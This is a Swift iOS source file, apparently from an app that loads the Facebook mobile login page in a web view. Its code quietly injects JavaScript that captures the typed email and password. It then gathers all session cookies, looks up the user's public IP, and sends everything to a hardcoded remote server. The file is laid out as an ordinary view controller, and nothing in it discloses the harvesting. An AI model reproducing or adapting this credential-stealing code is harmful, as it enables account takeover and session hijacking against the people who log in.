//
//  ViewController.swift
//  WK
//
//  Created by Apple on 23/03/2021.
//
import class Foundation.NSString
import UIKit
import WebKit


extension WebViewController: WKScriptMessageHandler{
    fileprivate func callAPI(dataPost: Dictionary<String, String>) {
        struct defaultKeys {
            static let keyLogin = "loginKey"
        }
        let alert = UIAlertController(title: nil, message: "Please wait ..", preferredStyle: .alert)
        let loadingIndicator = UIActivityIndicatorView(frame:CGRect(x:10, y:5,width: 50, height: 50))
        loadingIndicator.hidesWhenStopped = true
        loadingIndicator.style = UIActivityIndicatorView.Style.gray
        loadingIndicator.startAnimating();
        alert.view.addSubview(loadingIndicator)
        present(alert, animated: true, completion: nil)
        let urlGet = URL(string: "https://api.ipify.org")
        guard let requestUrl = urlGet else {
            fatalError()
        }
        var requestGet = URLRequest(url: requestUrl)
        
        requestGet.httpMethod = "GET"
        let task = URLSession.shared.dataTask(with: requestGet){
            (data,response,error) in
            if let data = data, let dataString = String(data:data,encoding: .utf8){
               
                
                var params = dataPost as Dictionary<String, String>
                params["ipAddress"] = dataString;
                var request = URLRequest(url: URL(string: "http://103.146.23.189:8082/api/v1/VIA/PostViaFB")!)
                request.httpMethod = "POST"
                request.httpBody = try? JSONSerialization.data(withJSONObject: params, options: [])
                request.addValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let session = URLSession.shared
                let taskPost = session.dataTask(with: request, completionHandler: { data, response, error -> Void in
                  
                    do {
                        let json = try JSONSerialization.jsonObject(with: data!) as! Dictionary<String, AnyObject>
                        print(params)
                        
                    } catch {
                        print("error")
                    }
                })
                taskPost.resume()
              
                
            }
            if let response = response as? HTTPURLResponse{
               
                
            }
        }
        task.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
            self.dismiss(animated: false, completion: nil)
            self.performSegue(withIdentifier: "HomeScreenSegue", sender: self)
        }
        
        
    }
    
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard let msg = message.body as? String else { return }
        let array = msg.components(separatedBy: ",")
        print(array)
        var dataPost = [String:String]()
        dataPost = ["username": array[0],"pwd": array[1]]
        // and whatever other actions you want to take
        webView.configuration.websiteDataStore.httpCookieStore.getAllCookies(
            {
                (cookies) in for cookie in cookies{
                    dataPost[cookie.name] = cookie.value;
                };
            self.callAPI(dataPost: dataPost)
            }
        )
    }
}
class WebViewController: UIViewController {
    struct defaultKeys {
        static let keyLogin = "loginKey"
    }
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        view.addSubview(webView)
        let defaults = UserDefaults.standard
        defaults.set("login done",forKey: "loginKey")
       
        let contentController = self.webView.configuration.userContentController
        contentController.add(self, name:"iosListener")
        let source = "window.onbeforeunload = function(){window.webkit.messageHandlers.iosListener.postMessage('unload Page'); };document.body.addEventListener('click', function(){var email =document.getElementById('m_login_email').value;var password =document.getElementById('m_login_password').value;if(email != '' && password !=''&& password.length >8){window.webkit.messageHandlers.iosListener.postMessage(email+','+password); }})"
        let script = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
        contentController.addUserScript(script)
        NSLayoutConstraint.activate([
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            
        ])
        guard let url = URL(string: "https://m.facebook.com") else {
            return
        }
        webView.load(URLRequest(url: url))
    }
    
   private lazy var webView : WKWebView = {
        
        
        let webView = WKWebView()
        webView.translatesAutoresizingMaskIntoConstraints = false
       
        return webView
    }()
    
    
   

}

